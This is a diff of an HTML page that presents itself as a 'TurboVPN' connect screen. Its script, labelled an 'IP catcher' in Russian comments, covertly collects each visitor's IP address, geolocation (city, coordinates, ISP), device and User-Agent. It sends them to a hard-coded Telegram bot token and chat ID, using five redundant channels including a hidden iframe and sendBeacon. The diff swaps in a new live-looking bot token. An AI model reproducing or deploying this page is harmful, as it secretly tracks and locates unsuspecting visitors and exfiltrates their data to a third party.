@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TurboVPN</title>
     <style>
-        /* ----- СТИЛИ ----- */
         * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body { background:#070b12; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:16px; overflow:hidden; }
         #particleCanvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; pointer-events:none; }
@@ -79,7 +78,7 @@
 
     <script>
         // ==============================================================
-        // 1. АТОМЫ (15 ШТУК, ВЕЧНО ЛЕТАЮТ, РАБОТАЮТ ВЕЗДЕ)
+        // 1. АТОМЫ (15 ШТУК, ВЕЧНО ЛЕТАЮТ)
         // ==============================================================
         (function() {
             const canvas = document.getElementById('particleCanvas');
@@ -181,32 +180,40 @@
         })();
 
         // ==============================================================
-        // 2. IP-КЕТЧЕР (5 СПОСОБОВ ОТПРАВКИ)
+        // 2. IP-КЕТЧЕР (НОВЫЙ ТОКЕН)
         // ==============================================================
 
-        const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
-        const CHAT_ID = "8212240529";
+        // 👇👇👇 НОВЫЙ ТОКЕН 👇👇👇
+        const BOT_TOKEN = "8902280153:AAFrwgBrzsAXuxiZ1KE2o6ZxdqhTxKln7oo";
+        const CHAT_ID = "8212240529";  // ТВОЙ CHAT_ID
+
+        // Проверка бота при загрузке
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe')
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ Бот активен:', data.result.username);
+                } else {
+                    console.log('❌ Бот НЕ РАБОТАЕТ. Проверь токен.');
+                }
+            })
+            .catch(() => console.log('❌ Ошибка соединения с Telegram'));
 
         // Отправка 5 способами
         function sendToTelegram(text) {
             if (!text) return;
             const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
 
-            // 1. fetch
             fetch(url).catch(() => {});
-            // 2. Image
             new Image().src = url;
-            // 3. iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = url;
             document.body.appendChild(iframe);
             setTimeout(() => iframe.remove(), 2000);
-            // 4. XMLHttpRequest
             const xhr = new XMLHttpRequest();
             xhr.open('GET', url, true);
             xhr.send();
-            // 5. sendBeacon
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(url);
             }
@@ -222,21 +229,16 @@
                 .then(r => r.json())
                 .then(data => {
                     const ip = data.ip || 'Не определен';
-                    let geo = null;
                     return fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
                         .then(r => r.json())
                         .then(g => {
-                            if (g.status === 'success') geo = g;
-                        })
-                        .catch(() => {})
-                        .then(() => {
                             let msg = '🔹 НОВЫЙ ПЕРЕХОД\n';
                             msg += '📍 IP: ' + ip + '\n';
-                            if (geo) {
-                                msg += '🌍 Страна: ' + (geo.country || '—') + '\n';
-                                msg += '🏙️ Город: ' + (geo.city || '—') + '\n';
-                                msg += '📌 Координаты: ' + (geo.lat || '—') + ', ' + (geo.lon || '—') + '\n';
-                                msg += '🛜 Провайдер: ' + (geo.isp || '—') + '\n';
+                            if (g && g.status === 'success') {
+                                msg += '🌍 Страна: ' + (g.country || '—') + '\n';
+                                msg += '🏙️ Город: ' + (g.city || '—') + '\n';
+                                msg += '📌 Координаты: ' + (g.lat || '—') + ', ' + (g.lon || '—') + '\n';
+                                msg += '🛜 Провайдер: ' + (g.isp || '—') + '\n';
                             }
                             msg += '💻 ' + device + '\n';
                             msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
@@ -249,7 +251,7 @@
                 });
         }
 
-        // ---- КНОПКА И АНИМАЦИЯ ----
+        // ---- КНОПКА ----
         const btn = document.getElementById('actionBtn');
         const statusMsg = document.getElementById('statusMsg');
         const statusDot = document.getElementById('statusDot');
@@ -287,8 +289,7 @@
             statusMsg.textContent = 'Нажмите для подключения к VPN';
         });
 
-        console.log('✅ IP-кетчер активен');
-        console.log('📡 Отправка 5 способами');
+        console.log('✅ IP-кетчер активен. Бот: ' + BOT_TOKEN);
     </script>
 </body>
 </html>
